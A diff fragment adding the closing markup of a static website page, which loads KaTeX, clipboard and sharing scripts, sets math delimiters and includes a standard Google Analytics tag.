+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
+</html>
